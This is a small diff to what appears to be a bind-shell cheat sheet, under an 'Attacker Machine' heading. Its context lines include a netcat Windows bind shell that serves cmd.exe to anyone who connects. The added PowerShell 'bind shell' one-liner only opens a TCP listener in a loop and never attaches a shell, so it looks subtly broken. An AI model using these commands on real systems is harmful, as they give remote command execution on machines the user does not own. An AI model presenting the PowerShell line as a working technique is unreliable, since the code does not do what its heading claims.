@@ -43,6 +43,11 @@ nc -nv <target_machine_ip> <port>
 nc.exe -lvp <BIND_PORT> -e cmd.exe
 ```
 
+Using Powershell
+
+```powershell
+powershell -c "New-Object System.Net.Sockets.TcpListener(<BIND_PORT>).Start(); while($true){$client = (New-Object System.Net.Sockets.TcpListener(<BIND_PORT>)).AcceptTcpClient()}"
+```
 ### Attacker Machine
 
 ```bash
